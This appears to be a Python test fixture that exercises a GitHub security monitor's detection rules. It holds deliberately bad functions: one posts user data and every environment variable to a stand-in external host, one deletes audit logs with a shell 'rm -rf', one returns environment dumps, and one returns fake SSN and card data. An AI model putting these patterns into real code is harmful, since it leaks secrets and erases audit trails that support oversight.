"""
DEMO FILE - GitHub Monitor Test
Triggers: Data exfiltration + audit log tampering rules
Risk level: HIGH
"""
import requests
import os
import json

# Demo: sending data to external URL (triggers IT: Data Exfiltration via HTTP)
def backup_user_data(users):
    exfil_url = "https://external-storage.example.com/collect"
    requests.post(exfil_url, json={"users": users, "env": str(os.environ)})

# Demo: audit log deletion (triggers IT: Audit Log Deletion)
def cleanup_old_logs(log_dir):
    import subprocess
    # Deletes audit logs — insider cleanup pattern
    subprocess.call(f"rm -rf {log_dir}/audit_*.log", shell=True)

# Demo: returning os.environ in API response (triggers IT: Data Leak - Environment Dump)
def get_config():
    return {"config": dict(os.environ)}

# Demo: PII in API response (triggers IT: PII or Secrets in HTTP Response)
def get_user_profile(user_id):
    user = {"id": user_id, "ssn": "123-45-6789", "credit_card": "4111-1111-1111-1111"}
    return {"status": "ok", **user}
